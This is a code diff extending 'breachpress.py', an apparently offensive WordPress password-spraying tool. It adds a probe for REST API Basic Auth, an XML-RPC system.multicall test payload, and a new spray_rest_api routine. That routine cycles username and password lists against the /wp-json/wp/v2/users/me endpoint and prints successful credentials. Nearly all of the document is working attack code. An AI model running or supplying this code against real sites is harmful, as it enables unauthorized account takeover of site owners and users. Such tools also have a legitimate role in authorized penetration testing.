@@ -103,6 +103,7 @@ class WordPressSpray:
         self.attack_surface = {
             'wp_login': False,
             'rest_api': False,
+            'rest_api_auth': False,
             'xmlrpc': False,
             'xmlrpc_multicall': False
         }
@@ -159,6 +160,27 @@ By: Michael @ Breach Craft
             if resp.status_code == 200:
                 self.attack_surface['rest_api'] = True
                 print(f"{Colors.OKGREEN}[+] REST API: Available{Colors.ENDC}")
+                
+                # Test if REST API authentication is possible
+                # Try a protected endpoint to see if Basic Auth works
+                posts_url = urljoin(self.target_url, '/wp-json/wp/v2/posts')
+                test_resp = self.session.post(
+                    posts_url,
+                    auth=('testuser', 'testpass'),
+                    json={'title': 'test', 'content': 'test', 'status': 'draft'},
+                    timeout=self.timeout
+                )
+                
+                # Check response - 401 means auth is working (just wrong creds)
+                # 403 might mean auth is disabled or other restrictions
+                if test_resp.status_code == 401:
+                    self.attack_surface['rest_api_auth'] = True
+                    print(f"{Colors.OKGREEN}[++] REST API Authentication: Available (Application Passwords){Colors.ENDC}")
+                elif test_resp.status_code == 403:
+                    print(f"{Colors.WARNING}[!] REST API Authentication: May be restricted{Colors.ENDC}")
+                else:
+                    if self.verbose:
+                        print(f"{Colors.WARNING}[!] REST API Authentication: Status {test_resp.status_code}{Colors.ENDC}")
             else:
                 print(f"{Colors.FAIL}[-] REST API: Not accessible (Status: {resp.status_code}){Colors.ENDC}")
         except Exception as e:
@@ -184,10 +206,72 @@ By: Michael @ Breach Craft
                 self.attack_surface['xmlrpc'] = True
                 print(f"{Colors.OKGREEN}[+] XML-RPC: Available{Colors.ENDC}")
                 
-                # Check for system.multicall
+                # Check for system.multicall in method list
                 if 'system.multicall' in resp.text:
-                    self.attack_surface['xmlrpc_multicall'] = True
-                    print(f"{Colors.OKGREEN}[++] XML-RPC system.multicall: Available (BEST ATTACK VECTOR){Colors.ENDC}")
+                    # Verify multicall actually works with a test call
+                    print(f"{Colors.OKCYAN}[*] Testing XML-RPC multicall with dummy credentials...{Colors.ENDC}")
+                    
+                    test_multicall_xml = """<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.multicall</methodName>
+  <params>
+    <param>
+      <value>
+        <array>
+          <data>
+            <value>
+              <struct>
+                <member>
+                  <name>methodName</name>
+                  <value><string>wp.getUsersBlogs</string></value>
+                </member>
+                <member>
+                  <name>params</name>
+                  <value>
+                    <array>
+                      <data>
+                        <value><string>testuser</string></value>
+                        <value><string>testpass</string></value>
+                      </data>
+                    </array>
+                  </value>
+                </member>
+              </struct>
+            </value>
+          </data>
+        </array>
+      </value>
+    </param>
+  </params>
+</methodCall>"""
+                    
+                    test_resp = self.session.post(
+                        xmlrpc_url,
+                        data=test_multicall_xml,
+                        headers={'Content-Type': 'application/xml'},
+                        timeout=self.timeout
+                    )
+                    
+                    # Check if multicall actually works
+                    # Valid responses: 403 (Incorrect username/password) or 200 with success
+                    # Blocked responses: 405, "services are disabled", etc.
+                    if test_resp.status_code == 200:
+                        # Parse response to check if it's a legitimate auth failure vs. blocked
+                        if 'XML-RPC services are disabled' in test_resp.text or 'faultCode>405<' in test_resp.text:
+                            print(f"{Colors.FAIL}[-] XML-RPC system.multicall: Blocked by security plugin{Colors.ENDC}")
+                            if self.verbose:
+                                print(f"{Colors.WARNING}[!] Response indicates XML-RPC is filtered/disabled{Colors.ENDC}")
+                        elif 'faultCode>403<' in test_resp.text or 'Incorrect username' in test_resp.text:
+                            # Legitimate auth failure = multicall is working!
+                            self.attack_surface['xmlrpc_multicall'] = True
+                            print(f"{Colors.OKGREEN}[++] XML-RPC system.multicall: Verified working (BEST ATTACK VECTOR){Colors.ENDC}")
+                        else:
+                            # Unknown response
+                            if self.verbose:
+                                print(f"{Colors.WARNING}[!] XML-RPC multicall returned unexpected response{Colors.ENDC}")
+                                print(f"{Colors.WARNING}[!] Response snippet: {test_resp.text[:200]}{Colors.ENDC}")
+                    else:
+                        print(f"{Colors.FAIL}[-] XML-RPC system.multicall: Test failed (Status: {test_resp.status_code}){Colors.ENDC}")
                 else:
                     print(f"{Colors.WARNING}[!] XML-RPC system.multicall: Not available{Colors.ENDC}")
             else:
@@ -518,6 +602,71 @@ By: Michael @ Breach Craft
                     self.logger.debug(f"Error testing {username}:{password} - {e}")
         
         return successful
+    
+    def spray_rest_api(self, usernames: List[str], passwords: List[str], delay: float = 0.5) -> List[Tuple[str, str]]:
+        """
+        Perform password spray using REST API with HTTP Basic Auth (Application Passwords)
+        
+        Args:
+            usernames: List of usernames to test
+            passwords: List of passwords to test  
+            delay: Delay between requests
+            
+        Returns:
+            List of successful (username, password) tuples
+        """
+        successful = []
+        print(f"\n{Colors.HEADER}[*] Spraying via REST API (Application Passwords / Basic Auth)...{Colors.ENDC}")
+        print(f"[*] Testing {len(usernames)} users with {len(passwords)} passwords")
+        
+        # Use a protected endpoint that requires authentication
+        # /wp-json/wp/v2/users/me returns current user info (requires auth)
+        rest_api_url = urljoin(self.target_url, '/wp-json/wp/v2/users/me')
+        total_attempts = len(usernames) * len(passwords)
+        current_attempt = 0
+        
+        for password in passwords:
+            print(f"\n{Colors.OKCYAN}[*] Testing password: {password}{Colors.ENDC}")
+            for username in usernames:
+                current_attempt += 1
+                
+                try:
+                    # WordPress REST API uses HTTP Basic Auth for Application Passwords
+                    resp = self.session.get(
+                        rest_api_url,
+                        auth=(username, password),
+                        timeout=self.timeout
+                    )
+                    
+                    if resp.status_code == 200:
+                        # Successful authentication - we got user data back
+                        successful.append((username, password))
+                        print(f"{Colors.OKGREEN}[+++] SUCCESS! {username}:{password}{Colors.ENDC}")
+                        if self.verbose:
+                            try:
+                                user_data = resp.json()
+                                print(f"    User ID: {user_data.get('id')}, Name: {user_data.get('name')}")
+                            except:
+                                pass
+                    elif resp.status_code == 401:
+                        # Authentication failed
+                        if self.verbose:
+                            print(f"[{current_attempt}/{total_attempts}] {username}:{password} - Failed (401 Unauthorized)")
+                    elif resp.status_code == 403:
+                        # Forbidden - might be rate limiting or other restriction
+                        print(f"{Colors.WARNING}[!] Got 403 Forbidden - possible rate limiting or IP block{Colors.ENDC}")
+                        if self.verbose:
+                            print(f"[{current_attempt}/{total_attempts}] {username}:{password} - Blocked")
+                    else:
+                        if self.verbose:
+                            print(f"[{current_attempt}/{total_attempts}] {username}:{password} - Status {resp.status_code}")
+                    
+                    time.sleep(delay)
+                    
+                except Exception as e:
+                    self.logger.debug(f"Error testing {username}:{password} - {e}")
+        
+        return successful
 
 
 def load_list_from_file(filepath: str) -> List[str]:
@@ -542,8 +691,8 @@ Examples:
   # Spray with userlist and passwordlist via best available method
   python3 breachpress.py -u https://example.com -U users.txt -P passwords.txt
   
-  # Force specific attack method
-  python3 breachpress.py -u https://example.com -U users.txt -P passwords.txt --method xmlrpc-multicall
+  # Force specific attack method (xmlrpc-multicall, xmlrpc-single, rest-api, wp-login)
+  python3 breachpress.py -u https://example.com -U users.txt -P passwords.txt --method rest-api
   
   # Enumerate users and spray in one go
   python3 breachpress.py -u https://example.com -P passwords.txt --auto-enum
@@ -561,7 +710,7 @@ Examples:
     parser.add_argument('-P', '--passwordlist', help='File containing passwords (one per line)')
     parser.add_argument('--user', help='Single username to test')
     parser.add_argument('--password', help='Single password to test')
-    parser.add_argument('--method', choices=['auto', 'xmlrpc-multicall', 'xmlrpc-single', 'wp-login'],
+    parser.add_argument('--method', choices=['auto', 'xmlrpc-multicall', 'xmlrpc-single', 'wp-login', 'rest-api'],
                        default='auto', help='Attack method (default: auto - uses best available)')
     parser.add_argument('--enumerate-only', action='store_true', 
                        help='Only enumerate attack surface and users, do not spray')
@@ -643,6 +792,9 @@ Examples:
         elif attack_surface['xmlrpc']:
             method = 'xmlrpc-single'
             print(f"{Colors.WARNING}[*] Auto-selected method: XML-RPC Single (multicall not available){Colors.ENDC}")
+        elif attack_surface['rest_api_auth']:
+            method = 'rest-api'
+            print(f"{Colors.WARNING}[*] Auto-selected method: REST API Application Passwords{Colors.ENDC}")
         elif attack_surface['wp_login']:
             method = 'wp-login'
             print(f"{Colors.WARNING}[*] Auto-selected method: wp-login.php (least efficient){Colors.ENDC}")
@@ -664,6 +816,12 @@ Examples:
             print(f"{Colors.FAIL}[-] XML-RPC not available!{Colors.ENDC}")
             sys.exit(1)
         successful = spray.spray_xmlrpc_single(usernames, passwords, args.delay)
+    
+    elif method == 'rest-api':
+        if not attack_surface['rest_api_auth']:
+            print(f"{Colors.FAIL}[-] REST API authentication not available!{Colors.ENDC}")
+            sys.exit(1)
+        successful = spray.spray_rest_api(usernames, passwords, args.delay)
     
     elif method == 'wp-login':
         if not attack_surface['wp_login']:
